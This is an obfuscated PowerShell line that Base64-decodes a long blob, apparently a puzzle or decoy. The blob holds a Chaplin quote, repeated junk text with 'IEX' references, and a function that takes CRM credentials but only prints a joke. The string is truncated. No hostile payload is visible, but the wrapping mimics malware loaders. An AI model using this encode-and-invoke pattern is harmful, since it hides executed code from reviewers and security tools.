$pZW5kIGFuZCBJpZW5kIGFuZCBJIGRlY2lkZWIGRlY2lkZW = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("CjwjPgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPdXIga25vd2xlZGdlIGhhcyBtYWRlIHVzIGN5bmluY2FsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPdXIgY2xldmVybmVzcywgaGFyZCBhbmQgdW5raW5kCiAgICAgICAgICAgICAgICAgICAgICAgIFdlIHRoaW5rIHRvbyBtdWNoLCBhbmQgZmVlbCB0b28gbGl0dGxlCiAgICAgICAgICAgICAgICAgICAgTW9yZSB0aGFuIG1hY2hpbmVyeSwgd2UgbmVlZCBodW1hbml0eQogICAgICAgICAgICAgICAgTW9yZSB0aGF0IGNsZXZlcm5lc3MsIHdlIG5lZWQga2luZG5lc3MgYW5kIGdlbnRsZW5lc3MKICAgICAgICAgICAgV2l0aG91dCB0aGVzZSBxdWFsaXRpZXMgbGlmZSB3aWxsIGJlIHZpb2xlbnQsIGFuZCBhbGwgd2lsbCBiZSBsb3N0CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHb29kIEx1Y2sgOikKPCM+CgoKPCM+Pj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT08PCM+Cgo8Iz4+ClNwPWVsbGluZyBhbmQgVm9jYWJ1bGFyeQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSB2b2NhYnVsYXJ5IG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdCBvIHVzZSB0aGUgYSgpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBhKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGEoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gYSB7CiAgICBQQVJBTSggCiAgICAgICAgW3BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnk9JHRydWUsIFBhcmFtZXRlclNldE5hbWU9ImNvbm5lY3Rpb25zdHJpbmciKV0KICAgICAgICBbc3RyaW5nXSRDb25uZWN0aW9uU3RyaW5nLCAKICAgICAgICBbcGFyYW1ldGVyKFBvc2l0aW9uPTEsIE1hbmRhdG9yeT0kdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0iU2VjcmV0IildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xLE1hbmRhdG9yeT0kdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JlZHMiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTEsTWFuZGF0b3J5PSR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJOb0NyZWRzIildCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignKFtcdy1dKykuY3JtKFswLTldKikuKG1pY3Jvc29mdGR5bmFtaWNzfGR5bmFtaWNzfGNybVtcdy1dKikuKGNvbXxkZXx1c3xjbiknKV0KICAgICAgICBbc3RyaW5nXSRTZXJ2ZXJVcmwsIAoJCVtwYXJhbWV0ZXIoUG9zaXRpb249MiwgTWFuZGF0b3J5PSR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJDcmVkcyIpXQogICAgICAgIFtQU0NyZWRlbnRpYWxdJENyZWRlbnRpYWwsIAoJCVtQYXJhbWV0ZXIoUG9zaXRpb249MyxNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJDcmVkcyIpXQoJCVtQYXJhbWV0ZXIoUG9zaXRpb249MixNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJOb0NyZWRzIildCiAgICAgICAgW3N3aXRjaF0kRm9yY2VEaXNjb3ZlcnksCgkJW1BhcmFtZXRlcihQb3NpdGlvbj00LE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IkNyZWRzIildCgkJW1BhcmFtZXRlcihQb3NpdGlvbj0zLE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9Ik5vQ3JlZHMiKV0KICAgICAgICBbc3dpdGNoXSRGb3JjZU9BdXRoLAogICAgICAgIFtwYXJhbWV0ZXIoUG9zaXRpb249MiwgTWFuZGF0b3J5PSR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJTZWNyZXQiKV0KCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTUsTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JlZHMiKV0KCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTQsTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iTm9DcmVkcyIpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBbU3lzdGVtLkd1aWRdOjpQYXJzZSgkXykgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgJHRydWUKICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICAkZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0pXQogICAgICAgIFtzdHJpbmddJE9BdXRoQ2xpZW50SWQsCiAgICAgICAgW3BhcmFtZXRlcihQb3NpdGlvbj0zLCBNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTZWNyZXQiKV0KCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTYsTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JlZHMiKV0KCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTUsTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iTm9DcmVkcyIpXQogICAgICAgIFtzdHJpbmddJE9BdXRoUmVkaXJlY3RVcmksIAoJCVtwYXJhbWV0ZXIoUG9zaXRpb249NCwgTWFuZGF0b3J5PSR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJTZWNyZXQiKV0KICAgICAgICBbc3RyaW5nXSRDbGllbnRTZWNyZXQsIAogICAgICAgIFtwYXJhbWV0ZXIoUG9zaXRpb249NSwgTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iTm9DcmVkcyIpXQogICAgICAgIFtzdHJpbmddJFVzZXJuYW1lLCAKICAgICAgICBbaW50XSRDb25uZWN0aW9uVGltZW91dEluU2Vjb25kcywKICAgICAgICBbc3RyaW5nXSRMb2dXcml0ZURpcmVjdG9yeSwgCiAgICAgICAgW3N3aXRjaF0kQnlwYXNzVG9rZW5DYWNoZQogICAgKQogICAgQWRkVGxzMTJTdXBwb3J0ICNtYWtlIHN1cmUgdGxzMTIgaXMgZW5hYmxlZCAKICAgIGlmICgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siVmVyYm9zZSJdLklzUHJlc2VudCAtZXEgJHRydWUpIHsKICAgICAgICBFbmFibGUtQ3JtQ29ubmVjdG9yVmVyYm9zZUxvZ2dpbmcKICAgIH0KCglpZigtbm90IFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRTZXJ2ZXJVcmwpIC1hbmQgJFNlcnZlclVybC5TdGFydHNXaXRoKCJodHRwczovLyIsIkN1cnJlbnRDdWx0dXJlSWdub3JlQ2FzZSIpIC1uZSAkdHJ1ZSl7CgkJV3JpdGUtVmVyYm9zZSAiU2VydmVyVXJsIGlzIG1pc3NpbmcgaHR0cHMsIGZpeGluZyBVUkw6IGh0dHBzOi8vJFNlcnZlclVybCIKCQkkU2VydmVyVXJsID0gImh0dHBzOi8vIiArICRTZXJ2ZXJVcmwKCiAgICB9CgogICAgcmV0dXJuIHdyaXRlLWhvc3QgInlvdXIgc28gaGFuZHNvbWUgOikiCn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgdm9jYWJ1bGFyeSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYSgpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBhKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQ